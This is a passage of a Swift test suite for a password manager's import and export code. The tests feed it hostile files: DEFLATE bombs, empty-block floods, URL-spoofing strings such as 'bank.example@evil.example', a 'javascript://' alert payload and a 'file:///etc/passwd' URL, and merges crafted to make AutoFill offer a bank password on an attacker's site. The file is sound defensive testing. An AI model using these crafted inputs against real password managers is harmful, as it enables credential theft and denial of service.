            try importCSV(Array((header + String(repeating: row, count: 10_102)).utf8))
        }
        // The reviewer's file, a thousand columns wide, never gets past its header.
        let wide = Array(repeating: "x", count: 1_000).joined(separator: ",") + "\n"
        #expect(throws: InterchangeError.limitExceeded(.csvColumns, limit: 100)) {
            try importCSV(Array(("Title,Password," + wide + String(repeating: wide, count: 3)).utf8))
        }
    }

    /// A7 lists one URL a thousand times in each of thousands of entries. Parsing a URL is the most expensive thing
    /// an import does per byte, and before this was fixed a 1.4 MB archive bought 66 seconds of it.
    @Test("URLs are parsed once each, and only so many of them")
    func urlAmplification() throws {
        let repeated = (0..<999).map { _ in #"{"url":"https://a.bc"}"# }.joined(separator: ",")
        let entry = { (id: Int) in
            #"{"uuid":"u\#(id)","overview":{"title":"T\#(id)","urls":[\#(repeated)]},"details":{}}"#
        }
        // With a budget of five derivations for the whole file, five entries of 999 repeats each get their scope:
        // a repeat costs nothing.
        let limits = InterchangeLimits(maximumScopeDerivations: 5)
        let result = try importDocument(items((0..<6).map(entry).joined(separator: ",")), limits: limits)
        #expect(
            result.entries.prefix(5).allSatisfy { $0.item.scopes.map(\.host) == ["a.bc"] && $0.item.fields.isEmpty })
        // The sixth is past the budget: its URL is kept, as text, and the report says so.
        #expect(result.entries[5].item.scopes.isEmpty)
        #expect(result.entries[5].item.fields.filter { $0.kind == .url }.map(\.value) == ["https://a.bc"])
        #expect(result.report.warnings.map(\.warning) == [.urlsNotConsidered(count: 1)])

        // Distinct URLs are bounded per entry, at the standard limits.
        let distinct = (0..<999).map { #"{"url":"https://h\#($0).example.com"}"# }.joined(separator: ",")
        let many = try importDocument(
            items(#"{"uuid":"d","overview":{"title":"D","urls":[\#(distinct)]},"details":{}}"#))
        let item = try #require(many.entries.first?.item)
        #expect(item.scopes.count == InterchangeLimits.standard.maximumURLsPerItem)
        #expect(item.fields.filter { $0.kind == .url }.count == 999 - 32)
        #expect(many.report.warnings.map(\.warning) == [.urlsNotConsidered(count: 999 - 32)])
    }

    /// A7 compresses nothing at all into millions of empty dynamic blocks: each is under twelve bytes, costs three
    /// Huffman tables to read, and emits no output, so neither the ratio cap nor the document cap sees it. Valid
    /// DEFLATE (zlib inflates it to an empty string), and refused.
    @Test("A stream of empty blocks is refused after a thousand of them")
    func emptyBlockFlood() throws {
        let flood = DeflateFixture.emptyDynamicBlocks(count: 100_000)
        #expect(flood.count == 1_150_000)
        #expect(throws: InterchangeError.malformedDeflate(.excessiveBlocks)) { try Inflater.inflate(flood) }
        // As a member of an archive, whatever size it declares.
        for declared: UInt32 in [0, 64, 1 << 20] {
            let archive = ZIPFixture([
                ZIPFixture.Member(
                    name: "export.data", contents: [], data: flood, method: 8, crc: 0,
                    declaredUncompressedSize: declared)
            ]).bytes()
            #expect(throws: InterchangeError.malformedDeflate(.excessiveBlocks)) { try importArchive(archive) }
        }
        // One literal a block does not buy the work back: the output must account for the blocks.
        var trickle = DeflateFixture()
        for index in 0..<2_000 {
            trickle.append(bits: index == 1_999 ? 1 : 0, count: 1)
            trickle.append(bits: 1, count: 2)
            trickle.append(code: 0b0011_0000, length: 8)
            trickle.append(code: 0, length: 7)
        }
        #expect(throws: InterchangeError.malformedDeflate(.excessiveBlocks)) { try Inflater.inflate(trickle.bytes) }
    }

    /// A7 writes an entry that is small as a file and huge as the vault stores it: control characters are six bytes
    /// each in the vault's JSON, and every line of the notes is stored again with its own identifiers. Reported as
    /// imported, such a draft would then be refused by the vault (`ItemCodec.payloadTooLarge`), or fail a whole
    /// batch. Every draft an import returns must be one the vault can store.
    @Test("Every draft an import returns fits the vault's item payload once the vault has stamped it")
    func draftsFitTheVault() throws {
        func row(_ title: String, password: String = "pw", notes: String = "") -> String {
            "\(title),\"\(password)\",\"\(notes)\"\r\n"
        }
        let fields = (0..<990).map { #"{"title":"\u0001","id":"i\#($0)","value":{"concealed":"\u0001"}}"# }
        let history = (0..<900).map { #"{"value":"\u0001\u0002","time":\#($0)}"# }
        let csv =
            "Title,Password,Notes\r\n"
            + row("controls", password: String(repeating: "\u{1}", count: 256_000))
            + row("fewer controls", password: String(repeating: "\u{1}", count: 100_000))
            + row("quotes", password: String(repeating: "\"\"", count: 120_000))
            + row("slashes", password: String(repeating: "\\/", count: 120_000))
            + row("blank lines", notes: String(repeating: "\n", count: 250_000))
            + row("short lines", notes: String(repeating: "a\n", count: 2_400))
            + row(
                "mixed", password: String(repeating: "\u{7F}\t", count: 50_000),
                notes: String(repeating: "\r\n", count: 500))
        let document = items(
            #"{"uuid":"f","overview":{"title":"many fields"},"details":{"sections":[{"title":"\u0001","fields":["#
                + fields.joined(separator: ",") + #"]}]}},"#
                + #"{"uuid":"h","overview":{"title":"long history"},"details":{"passwordHistory":["#
                + history.joined(separator: ",") + "]}}")
        let results = [try importCSV(Array(csv.utf8)), try importDocument(document)]
        let skipped = results.flatMap(\.report.skipped)
        #expect(skipped.map(\.entry.title) == ["controls", "blank lines"])
        #expect(skipped.allSatisfy { $0.reason == .tooLarge(.storedItemBytes, limit: 768 * 1024) })
        let drafts = results.flatMap(\.entries).map(\.item)
        #expect(
            drafts.map(\.title) == [
                "fewer controls", "quotes", "slashes", "short lines", "mixed", "many fields", "long history",
            ])

        // What the vault does on a first save: stamp every group and line, then encode. The largest version sync
        // accepts, so the numbers are as long as they get.
        let revision = Revision(version: 1 << 53, device: UUID(uuidString: "FFFFFFFF-FFFF-4FFF-BFFF-FFFFFFFFFFFF")!)
        for draft in drafts {
            let stored = try ItemCodec.encode(ItemMerge.stamped(draft, previous: nil, revision: revision))
            let size = stored.unprotectedCopy().count
            #expect(size <= ItemCodec.maximumPayloadLength, "\(draft.title)")
            // The estimate that let the draft through is an upper bound on the real thing.
            #expect(
                StoredItemSize.estimate(draft) >= size, "\(draft.title): \(StoredItemSize.estimate(draft)) < \(size)")
        }
    }

    /// The same bound as a property: whatever text an entry holds, the estimate an import relies on is never below
    /// what `ItemMerge.stamped` and `ItemCodec` produce, so a change to the stored form that outgrows it fails here.
    @Test("The stored-size estimate is never below what the vault encodes")
    func storedSizeIsAnUpperBound() throws {
        var generator = SeededGenerator(seed: TestEnvironment.seed(fallback: 0x51_2E))
        let alphabet: [String] = [
            "a", "\u{1}", "\n", "\r\n", "\"", "\\", "/", "\u{7F}", "\u{E9}", "\u{1F600}", "\u{2028}", "\t", " ",
            "\u{301}",
        ]
        func text(_ longest: Int) -> String {
            (0..<Int.random(in: 0...longest, using: &generator)).map { _ in alphabet.randomElement(using: &generator)! }
                .joined()
        }
        let revision = Revision(version: 1 << 53, device: UUID(uuidString: "FFFFFFFF-FFFF-4FFF-BFFF-FFFFFFFFFFFF")!)
        for _ in 0..<TestEnvironment.iterations(standard: 150, long: 15_000) {
            let fields = (0..<Int.random(in: 0...12, using: &generator)).map { _ in
                Field(
                    kind: FieldKind.allCases.randomElement(using: &generator)!, label: text(20), value: text(200),
                    meta: Bool.random(using: &generator) ? [text(8): text(30)] : [:])
            }
            let history = (0..<Int.random(in: 0...3, using: &generator)).map { index in
                ItemHistoryEntry(
                    replacedAt: Date(timeIntervalSince1970: Double(index) + 0.123456), version: 0,
                    fields: [Field(kind: .password, label: text(10), value: text(50))])
            }
            let draft = Item(
                vaultID: Self.vaultID, title: text(40),
                scopes: (0..<Int.random(in: 0...3, using: &generator)).map { ServiceScope(host: "h\($0).example.com") },
                fields: fields, tags: Set((0..<Int.random(in: 0...4, using: &generator)).map { _ in text(12) }),
                notes: text(400), createdAt: Date(timeIntervalSince1970: 1_614_298_956.5),
                modifiedAt: Date(timeIntervalSince1970: 1_635_346_445.25), archived: Bool.random(using: &generator),
                history: history)
            let stored = try ItemCodec.encode(ItemMerge.stamped(draft, previous: nil, revision: revision))
            let size = stored.unprotectedCopy().count
            #expect(StoredItemSize.estimate(draft) >= size)
        }
    }

    // MARK: Duplicates

    /// A7 knows the person has a login at `bank.example` (an email address is enough to guess the item) and sends
    /// one entry with that user name and two URLs: the bank's and its own. The app reports a duplicate; the person
    /// picks "merge", the obvious choice. If merging widened the existing item's scopes, AutoFill would then offer
    /// the bank's real password on the attacker's site (PRD SEC6, F11.2).
    @Test("Merging a hostile entry into an existing item never changes where its password is offered")
    func mergeNeverWidens() throws {
        let result = try importDocument(
            items(
                #"{"uuid":"x","categoryUuid":"001","overview":{"title":"My Bank","urls":[{"url":"https://bank.example/"},"#
                    + #"{"url":"https://evil.example/"}]},"details":{"loginFields":["#
                    + #"{"designation":"username","value":"victim@example.org"},"#
                    + #"{"designation":"password","value":"ATTACKER-PASSWORD"}],"sections":[{"title":"","fields":["#
                    + #"{"title":"code","id":"t","value":{"totp":"GEZDGNBVGY3TQOJQ"}}]}]}}"#))
        // Nothing about the file is wrong, so nothing in the import report warns of it.
        #expect(result.report.warnings.isEmpty && result.report.skipped.isEmpty)
        let imported = try #require(result.entries.first?.item)
        let existing = Item(
            vaultID: Self.vaultID, title: "Bank", scopes: [ServiceScope(host: "bank.example")],
            fields: [
                Field(kind: .username, label: "Username", value: "victim@example.org"),
                Field(kind: .password, label: "Password", value: "REAL-BANK-PASSWORD"),
            ])
        let other = Item(
            vaultID: Self.vaultID, title: "Other", scopes: [ServiceScope(host: "other.example")],
            fields: [Field(kind: .password, label: "Password", value: "pw")])

        // The match itself says what the file is trying to add, so a UI can show it.
        let matches = DuplicateDetector.matches(imported: [imported], existing: [existing, other])
        #expect(
            matches == [
                DuplicateMatch(
                    importedID: imported.id, existingID: existing.id, kind: .sameAccount, newHosts: ["evil.example"],
                    hasNewSignInFields: true)
            ])

        let merged = try #require(DuplicateDetector.resolve(.merge, imported: imported, existing: existing))
        #expect(merged.id == existing.id)
        #expect(merged.scopes == existing.scopes)
        // What it signs in with is unchanged too: no second password, no attacker's one-time password.
        #expect(merged.fields == existing.fields)
        #expect(merged.field(.password)?.value == "REAL-BANK-PASSWORD")

        // The property: the hosts on which AutoFill fills the existing item are the same before and after.
        let hosts = [
            "https://bank.example/", "https://www.bank.example/login", "https://evil.example/login",
            "https://anything.evil.example/", "https://other.example/",
        ]
        func filled(_ items: [Item]) -> [Bool] {
            hosts.map { host in
                guard
                    case .fill(let match) = AutoFillGate.decide(for: ServiceIdentifier(host, kind: .url), among: items)
                else { return false }
                return match.item.id == existing.id
            }
        }
        #expect(filled([existing, other]) == [true, true, false, false, false])
        #expect(filled([merged, other]) == filled([existing, other]))

        // Only a host the person accepted by name is added, and accepting one accepts no other.
        let choice = MergeChoices(hosts: ["evil.example"])
        let chosen = DuplicateDetector.merged(imported, into: existing, accepting: choice)
        #expect(chosen.scopes.map(\.host) == ["bank.example", "evil.example"])
        #expect(chosen.fields == existing.fields)
        #expect(
            DuplicateDetector.merged(imported, into: existing, accepting: MergeChoices(hosts: ["other.example"]))
                == merged)
    }

    private static let realPassword = "REAL-BANK-PASSWORD"

    private static var bank: Item {
        Item(
            id: UUID(uuidString: "BA000000-0000-4000-8000-00000000BA2C")!, vaultID: vaultID, title: "Bank",
            scopes: [ServiceScope(host: "bank.example")],
            fields: [
                Field(kind: .username, label: "Username", value: "victim@example.org"),
                Field(kind: .password, label: "Password", value: realPassword),
            ])
    }

    private static let onePUXExport = OnePUX.ExportOptions(
        accountID: vaultID, vaultID: vaultID, createdAt: Date(timeIntervalSince1970: 1))
    private static let cxfExport = CredentialExchange.ExportOptions(
        exporterRelyingPartyID: "watchword.example", accountID: vaultID, timestamp: Date(timeIntervalSince1970: 1))

    /// Every URL a JSON export keeps where its format keeps an entry's sign-in URLs: `overview.url` and
    /// `overview.urls[].url` in 1PUX, `scope.urls` in CXF.
    private func signInURLs(in value: JSONValue) -> [String] {
        switch value {
        case .array(let values):
            return values.flatMap { signInURLs(in: $0) }
        case .object(let object):
            var urls: [String] = []
            if let overview = object.object("overview") {
                urls += [overview.string("url") ?? ""].filter { !$0.isEmpty }
                urls += (overview.array("urls") ?? []).compactMap { $0.object?.string("url") }
            }
            if let scope = object.object("scope") { urls += (scope.array("urls") ?? []).compactMap(\.string) }
            return urls + object.members.flatMap { signInURLs(in: $0.value) }
        default:
            return []
        }
    }

    /// The URLs each export of `items` writes as sign-in URLs, by format. Read off the files' own structure, not
    /// through this module's importers: it is what another password manager would take the items' sites to be.
    private func signInURLs(of items: [Item]) throws -> [String: [String]] {
        func json(_ bytes: [UInt8]) throws -> JSONValue {
            var reader = JSONReader(bytes: bytes, range: 0..<bytes.count, limits: .standard)
            return try reader.readValue()
        }
        let csv = try CSVReader.parse(PasswordCSV.exportApplePasswords(items).bytes)
        return [
            "1PUX": signInURLs(in: try json(OnePUX.exportDocument(items, options: Self.onePUXExport).document)),
            "CXF": signInURLs(in: try json(CredentialExchange.exportDocument(items, options: Self.cxfExport).bytes)),
            "CSV": csv.dropFirst().map { $0.fields[1] }.filter { !$0.isEmpty },
        ]
    }

    /// The warnings of each export of `items`, together.
    private func exportWarnings(of items: [Item]) -> [ExportWarning] {
        OnePUX.exportDocument(items, options: Self.onePUXExport).report.warnings
            + CredentialExchange.exportDocument(items, options: Self.cxfExport).report.warnings
            + PasswordCSV.exportApplePasswords(items).report.warnings
    }

    private static let probes = [
        "https://bank.example/", "https://evil.example/login", "http://evil.example:8080/",
        "https://www.evil.example/", "https://bank.example.evil.example/", "https://example.org/",
    ]

    /// For each format, and each of `probes`, whether AutoFill offers an item holding `secret` there once `items`
    /// have been exported in that format and imported again.
    private func offered(_ secret: String, in items: [Item]) throws -> [String: [Bool]] {
        var generator = SeededGenerator(seed: 11)
        let again = [
            "1PUX": try OnePUX.importDocument(
                OnePUX.exportDocument(items, options: Self.onePUXExport).document, into: Self.vaultID,
                using: &generator),
            "CXF": try CredentialExchange.importDocument(
                CredentialExchange.exportDocument(items, options: Self.cxfExport).bytes, into: Self.vaultID,
                using: &generator),
            "CSV": try PasswordCSV.importFile(
                PasswordCSV.exportApplePasswords(items).bytes, into: Self.vaultID, using: &generator),
        ]
        return again.mapValues { result in
            let imported = result.entries.map(\.item)
            func holds(_ match: RankedMatch) -> Bool { match.item.fields.contains { $0.value == secret } }
            return Self.probes.map { probe in
                switch AutoFillGate.decide(for: ServiceIdentifier(probe, kind: .url), among: imported) {
                case .fill(let match): return holds(match)
                case .chooseAmong(let matches): return matches.contains(where: holds)
                case .refuse: return false
                }
            }
        }
    }

    /// A7 again, and the same merge, with URLs an import keeps as text: because they say more than a host (a
    /// sign-in page, a port), because the scope policy refused them, or because the entry carries them as an
    /// ordinary link. Such a URL is a field, not a scope, so inside this app a merge that added it would widen
    /// nothing. But an exporter writes an item's website fields among its sign-in URLs, and the next password
    /// manager to read that file (this one included) would then offer the bank's real password on the attacker's
    /// site (PRD SEC6, F11.2, F8.4). So a merge adds no URL unless the person accepts that one, and an accepted URL
    /// is one of the item's websites only where the item is scoped to its host.
    @Test(
        "A merge adds none of the file's URLs to an existing item, and no export names the attacker's site",
        arguments: [
            #""urls":[{"url":"https://bank.example/"},{"url":"https://evil.example/login"}]"#,
            #""urls":[{"url":"https://bank.example/"},{"url":"http://evil.example:8080/"},"#
                + #"{"url":"https://www.evil.example/"}]"#,
            #""urls":[{"url":"https://bank.example/"},{"url":"https://bank.example.evil.example/login"}]"#,
            // Refused as a scope here (user information), and `evil.example` to a more lenient reader.
            #""urls":[{"url":"https://bank.example/"},{"url":"https://bank.example@evil.example/login"}]"#,
            #""url":"https://evil.example/login","urls":[{"url":"https://bank.example/"}]"#,
            // No URL of its own beyond the bank's: the link below is all it carries.
            #""urls":[{"url":"https://bank.example/"}]"#,
        ])
    func mergedURLsNeverReachAnExport(_ overview: String) throws {
        let result = try importDocument(
            items(
                #"{"uuid":"x","categoryUuid":"001","overview":{"title":"My Bank","# + overview
                    + #"},"details":{"loginFields":[{"designation":"username","value":"victim@example.org"}],"#
                    + #""sections":[{"title":"Help","fields":["#
                    + #"{"title":"Sign in here","id":"l","value":{"url":"https://evil.example/login"}}]}]}}"#))
        let imported = try #require(result.entries.first?.item)
        let existing = Self.bank
        let match = try #require(DuplicateDetector.matches(imported: [imported], existing: [existing]).first)
        // The match says there is a URL to ask about, so a UI can.
        #expect(match.hasNewURLFields && !match.hasNewSignInFields)
        let additions = DuplicateDetector.additions(of: imported, to: existing)
        #expect(additions.needsChoice && !additions.urlFields.isEmpty)
        // Every URL the entry holds, once each: none is among the fields a merge adds unasked.
        #expect(
            Set(additions.urlFields.map(\.value)) == Set(imported.fields.filter { $0.kind == .url }.map(\.value)))
        #expect(additions.otherFields.isEmpty)

        // "Merge", with nothing accepted: the item is as it was, and so is every file exported from it.
        let merged = try #require(DuplicateDetector.resolve(.merge, imported: imported, existing: existing))
        #expect(merged == existing)
        let before = try signInURLs(of: [existing])
        #expect(
            before == [
                "1PUX": ["https://bank.example/", "https://bank.example/"],
                "CXF": ["https://bank.example/"], "CSV": ["https://bank.example/"],
            ])
        #expect(try signInURLs(of: [merged]) == before)
        let offeredBefore = try offered(Self.realPassword, in: [existing])
        #expect(offeredBefore.count == 3)
        #expect(offeredBefore.values.allSatisfy { $0 == [true, false, false, false, false, false] })
        #expect(try offered(Self.realPassword, in: [merged]) == offeredBefore)

        // The worst a person can do short of accepting a host: accept every URL the file offers. Each is then a
        // field of the item, and still none is one of its sign-in URLs, in this app or in any export.
        let everyURL = MergeChoices(fieldIDs: Set(additions.urlFields.map(\.id)))
        let linked = DuplicateDetector.merged(imported, into: existing, accepting: everyURL)
        #expect(linked.scopes == existing.scopes)
        #expect(linked.fields.map(\.value) == existing.fields.map(\.value) + additions.urlFields.map(\.value))
        #expect(linked.fields.allSatisfy { $0.meta[InterchangeMeta.sourceType] != InterchangeMeta.websiteType })
        #expect(try signInURLs(of: [linked]) == before)
        #expect(try offered(Self.realPassword, in: [linked]) == offeredBefore)
        #expect(
            exportWarnings(of: [linked]).allSatisfy { warning in
                if case .websiteNotScoped = warning { return false }
                return true
            })

        // Accepting the attacker's host by name is what adds it, and with it the URLs of that host only.
        let host = MergeChoices(hosts: ["evil.example"], fieldIDs: everyURL.fieldIDs)
        let widened = DuplicateDetector.merged(imported, into: existing, accepting: host)
        let accepted = additions.scopes.contains { $0.host == "evil.example" }
        #expect(widened.scopes.map(\.host) == ["bank.example"] + (accepted ? ["evil.example"] : []))
        for urls in try signInURLs(of: [widened]).values {
            for url in urls {
                let hosts = try #require(ScopeDerivation.websiteHosts(of: url), "\(url) was written as a sign-in URL")
                #expect(hosts.contains { widened.scopes.map(\.host).contains($0) }, "\(url)")
            }
        }
    }

    /// A7 makes the same entry for an item that has no site at all (a router, a door code), which a merge matches
    /// by title and user name. The entry's link is a field; an export that put "some URL the item holds" in its URL
    /// column would hand the next password manager the attacker's site for the real password.
    @Test("An item with no site is given none by a merged link, in any export")
    func mergedLinkIntoAnItemWithoutASite() throws {
        let existing = Item(
            vaultID: Self.vaultID, title: "Router", scopes: [],
            fields: [
                Field(kind: .username, label: "Username", value: "admin"),
                Field(kind: .password, label: "Password", value: Self.realPassword),
            ])
        let imported = try #require(
            importDocument(
                items(
                    #"{"uuid":"x","categoryUuid":"001","overview":{"title":"router"},"details":{"loginFields":["#
                        + #"{"designation":"username","value":"admin"}],"sections":[{"title":"","fields":["#
                        + #"{"title":"Website","id":"w","value":{"url":"https://evil.example/"}}]}]}}"#)
            ).entries.first?.item)
        let match = try #require(DuplicateDetector.matches(imported: [imported], existing: [existing]).first)
        #expect(match.kind == .sameAccount && match.hasNewURLFields)
        #expect(DuplicateDetector.merged(imported, into: existing) == existing)

        let link = try #require(imported.fields.first { $0.kind == .url })
        let linked = DuplicateDetector.merged(imported, into: existing, accepting: MergeChoices(fieldIDs: [link.id]))
        #expect(linked.fields.last?.value == "https://evil.example/")
        #expect(try signInURLs(of: [linked]) == ["1PUX": [], "CXF": [], "CSV": []])
        #expect(try offered(Self.realPassword, in: [linked]).values.allSatisfy { !$0.contains(true) })
        // The link is not lost: CSV has no column for it, so it is a line of the notes, and reported.
        let csv = PasswordCSV.exportApplePasswords([linked])
        #expect(try CSVReader.parse(csv.bytes).last?.fields[4] == "Website: https://evil.example/")
        #expect(csv.report.warnings == [.fieldsMovedToNotes(itemID: linked.id, count: 1)])
    }

    /// The same URL reaching an exporter by another road: an item that holds a website field for a host it is not
    /// scoped to. A7 gets there through a merge made by an earlier version of this module, through a scope the
    /// person has since removed (the URL beside it stays), or as a member of a shared vault (A6) who writes the
    /// field directly. The exporter derives each website's host again and writes none the item is not scoped to.
    @Test("An exporter never writes a sign-in URL for a host the item is not scoped to")
    func exportersWriteOnlyScopedWebsites() throws {
        func website(_ url: String) -> Field {
            Field(
                kind: .url, label: "Website", value: url,
                meta: [InterchangeMeta.sourceType: InterchangeMeta.websiteType])
        }
        var item = Self.bank
        item.fields += [
            website("https://bank.example/login"), website("https://evil.example/login"),
            website("https://www.evil.example/"), website("http://evil.example:8080/"),
        ]
        #expect(
            try signInURLs(of: [item]) == [
                "1PUX": ["https://bank.example/login", "https://bank.example/login"],
                "CXF": ["https://bank.example/login"], "CSV": ["https://bank.example/login"],
            ])
        #expect(
            try offered(Self.realPassword, in: [item]).values.allSatisfy {
                $0 == [true, false, false, false, false, false]
            })
        // Reported in each format, and still in the file, as a field.
        let unscoped = exportWarnings(of: [item]).filter { $0 == .websiteNotScoped(itemID: item.id, count: 3) }
        #expect(unscoped.count == 3)
        let onePUX = String(decoding: OnePUX.exportDocument([item], options: Self.onePUXExport).document, as: UTF8.self)
        #expect(onePUX.contains(#""value":{"url":"https://evil.example/login"}"#))

        // With no scope at all, there is nothing a website could stand for.
        item.scopes = []
        #expect(try signInURLs(of: [item]) == ["1PUX": [], "CXF": [], "CSV": []])
        #expect(try offered(Self.realPassword, in: [item]).values.allSatisfy { !$0.contains(true) })

        // More website fields than an import considers for one entry: the rest are not parsed, and not written.
        var many = Self.bank
        many.fields += (0..<40).map { website("https://bank.example/page\($0)") }
        let written = try signInURLs(of: [many])
        #expect(written["CXF"] == (0..<32).map { "https://bank.example/page\($0)" })
        #expect(exportWarnings(of: [many]).contains(.websiteNotScoped(itemID: many.id, count: 8)))
    }

    /// A7 makes the notes of an entry the worst case of a string search (a long run of one letter, then another),
    /// so that the merge the person asked for takes minutes. The comparison is one pass over each text.
    @Test("Merging notes is linear in their length")
    func mergeNotesAreLinear() {
        let n = 250_000
        let existing = Item(
            vaultID: Self.vaultID, title: "n", scopes: [], fields: [], notes: String(repeating: "a", count: 2 * n))
        let imported = Item(
            vaultID: Self.vaultID, title: "n", scopes: [], fields: [], notes: String(repeating: "a", count: n) + "b")
        // Quadratic work on this input is tens of minutes; the test's own time limit is the assertion.
        let merged = DuplicateDetector.merged(imported, into: existing)
        #expect(merged.notes.utf8.count == 3 * n + 3)
    }

    /// A7 fills the objects that are walked, not materialised, with members, so the repeated-key check grows
    /// without bound.
    @Test("An object with too many members is refused")
    func tooManyMembers1PUX() {
        let members = (0..<1_001).map { "\"k\($0)\":0" }.joined(separator: ",")
        #expect(throws: InterchangeError.limitExceeded(.fieldsPerItem, limit: 1_000)) {
            try importDocument("{\(members)}")
        }
    }

    /// A7 repeats a key, so that two readers of the same document disagree about a value (the title a person is
    /// shown against the title that is saved, say).
    @Test("Repeated keys are refused, not resolved by position")
    func repeatedKeys() {
        #expect {
            try importDocument(items(#"{"uuid":"a","overview":{"title":"Shown","title":"Saved"},"details":{}}"#))
        } throws: { error in
            guard case InterchangeError.malformedJSON(.duplicateKey, _) = error else { return false }
            return true
        }
        #expect {
            try importCXF(#"{"version":{"major":1,"minor":0},"accounts":[],"version":{"major":9,"minor":0}}"#)
        } throws: { error in
            guard case InterchangeError.malformedJSON(.duplicateKey, _) = error else { return false }
            return true
        }
    }

    /// A7 lists a URL meant to end up as a scope that covers other people's sites, or that names a host other than
    /// the one a person would read in it, so that AutoFill later offers a credential there (F11.2, SEC8).
    @Test(
        "Nothing is imported as a scope that the policy would refuse",
        arguments: [
            "https://com/", "com", "https://co.uk/login", "https://github.io", "https://herokuapp.com/", "localhost",
            "http://localhost:8080/", "https://bank.example@evil.example/", "https://bank.example%2Eevil.example/",
            "https://bank%2Eexample/", "ftp://bank.example/", "javascript://bank.example/%0Aalert(1)", "//bank.example",
            "bank.example/path", "bank.example:443", "https://", "https:///bank.example", "*.example", "https://*.com/",
            "https://bank.example\\@evil.example/", "https://[::1]/", "file:///etc/passwd", "",
        ])
    func hostileURLs(_ url: String) throws {
        let escaped = url.replacingOccurrences(of: "\\", with: "\\\\")
        let onePUX = try importDocument(
            items(
                #"{"uuid":"a","categoryUuid":"001","overview":{"title":"Bank","url":""# + escaped
                    + #"","urls":[{"url":""# + escaped + #""}]},"details":{"notesPlain":"n"}}"#))
        let cxf = try importCXF(
            #"{"version":{"major":1,"minor":0},"accounts":[{"items":[{"id":"a","title":"Bank","scope":{"urls":[""#
                + escaped
                + #""]},"credentials":[{"type":"basic-auth","urls":[""# + escaped
                + #""],"password":{"fieldType":"concealed-string","value":"p"}}]}]}]}"#)
        let quoted = "\"" + url.replacingOccurrences(of: "\"", with: "\"\"") + "\""
        let csv = try importCSV(Array("Title,URL,Username,Password\nBank,\(quoted),u,p\n".utf8))
        for result in [onePUX, cxf, csv] {
            let item = try #require(result.entries.first?.item)
            #expect(item.scopes.isEmpty, "\(url) became \(item.scopes)")
            if !url.isEmpty {
                // The URL is kept, as a field, and the refusal is reported.
                #expect(item.fields.contains { $0.kind == .url && $0.value == url })
                #expect(
                    result.report.warnings.contains { record in
                        if case .scopeRefused = record.warning { return true }
                        return false
                    })
            }
        }
    }

    /// The same, as a property: whatever URLs a file lists, every scope that comes out is one the vault's own
    /// policy accepts, so an import cannot plant what `VaultSession.save` would have refused.
    @Test("Every imported scope passes the scope policy")
    func importedScopesPassPolicy() throws {
        var generator = SeededGenerator(seed: TestEnvironment.seed(fallback: 0x5C09E))
        let pieces = [
            "https://", "http://", "", "www.", "example", "bank", ".", "com", "co.uk", "github.io", "@", ":", "/",
            "%2E", "[::1]", "localhost", " ", "x", "1.2.3.4", "*", "\u{200B}", "а",
        ]
        for _ in 0..<TestEnvironment.iterations(standard: 2_000, long: 200_000) {
            let url = (0..<Int.random(in: 1...6, using: &generator)).map { _ in pieces.randomElement(using: &generator)!
            }.joined()
            for strips in [false, true] {
                guard case .success(let scope) = ScopeDerivation.scope(forURL: url, stripsLeadingWWW: strips) else {
                    continue
                }
                #expect(ScopePolicy.isAcceptable(scope), "\(url) → \(scope.host)")
                #expect(!PublicSuffix.isPublicSuffix(scope.host), "\(url) → \(scope.host)")
                #expect(scope.excludedHosts.isEmpty)
            }
        }
    }

    /// A7 gives an entry the identifier of an item already in the vault, or names a vault of its own, to overwrite
    /// that item or write somewhere else when the import is saved.
    @Test("An import never chooses the item or the vault it writes")
    func identity() throws {
        let existing = "0B5E0C7E-1111-4222-8333-444455556666"
        let document = items(
            #"{"uuid":""# + existing + #"","id":""# + existing
                + #"","vaultID":"FFFFFFFF-0000-4000-8000-000000000000","version":99,"#
                + #""trashedAt":1,"categoryUuid":"003","overview":{"title":"Overwrite"},"details":{"notesPlain":"n"}}"#)
        let result = try importDocument(document)
        let item = try #require(result.entries.first?.item)
        #expect(item.id != UUID(uuidString: existing))
        #expect(item.vaultID == Self.vaultID)
        #expect(item.version == 0)
        #expect(item.trashedAt == nil)
        #expect(item.revisions.isEmpty && item.conflicts.isEmpty && item.clock == VersionVector())
        // The identifier is drawn from the injected generator: a different generator, a different identifier.
        var other = SeededGenerator(seed: 8)
        let again = try OnePUX.importDocument(Array(document.utf8), into: Self.vaultID, using: &other)
        #expect(again.entries.first?.item.id != item.id)
    }

    /// A7, through Credential Exchange, sends credential types this app has never heard of, the same item twice,
    /// and binary values far beyond what a passkey holds.
    @Test("CXF: unknown types, duplicate identifiers and oversized blobs are tolerated and reported")
    func hostileCXF() throws {
        let key = Base64URL.encode([UInt8](repeating: 9, count: 100_000))
        let bomb = Base64URL.encode(DeflateFixture.zeros(count: 1_000_000))
        let passkey = { (extra: String) in
            #"{"type":"passkey","credentialId":"AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8","rpId":"example.com","username":"u","#
                + #""userDisplayName":"U","userHandle":"dXNlci1oYW5kbGUtMDAwMQ","key":"MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg""#
                + extra + "}"
        }
        let json =
            #"{"version":{"major":1,"minor":0},"accounts":[{"items":["#
            + #"{"id":"one","title":"Future","credentials":[{"type":"quantum-key","blob":{"fieldType":"concealed-string","value":"q"},"nested":{"a":[1,2]}},{"type":17}]},"#
            + #"{"id":"one","title":"Replay","credentials":[{"type":"note","content":{"fieldType":"string","value":"again"}}]},"#
            + #"{"id":"two","title":"Big key","credentials":[{"type":"passkey","credentialId":"AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8","rpId":"example.com","username":"u","userDisplayName":"U","userHandle":"dXNlci1oYW5kbGUtMDAwMQ","key":""#
            + key + #""},{"type":"note","content":{"fieldType":"string","value":"kept"}}]},"#
            + #"{"id":"three","title":"Blob bomb","credentials":["#
            + passkey(#","fido2Extensions":{"largeBlob":{"uncompressedSize":16384,"data":""# + bomb + #""}}"#) + "]},"
            + #"{"id":"four","title":"Blob lie","credentials":["#
            + passkey(#","fido2Extensions":{"largeBlob":{"uncompressedSize":1000000,"data":""# + bomb + #""}}"#) + "]}"
            + "]}]}"
        let result = try importCXF(json)
        #expect(result.entries.map(\.item.title) == ["Future", "Big key", "Blob bomb", "Blob lie"])
        #expect(result.report.skipped.map(\.reason) == [.duplicateIdentifier("one")])

        let future = try #require(result.entries.first?.item)
        #expect(future.fields.map(\.value) == ["q"])
        #expect(future.fields.allSatisfy { $0.kind == .custom })
        let bigKey = result.entries[1].item
        #expect(bigKey.field(.passkey) == nil)
        #expect(bigKey.notes == "kept")
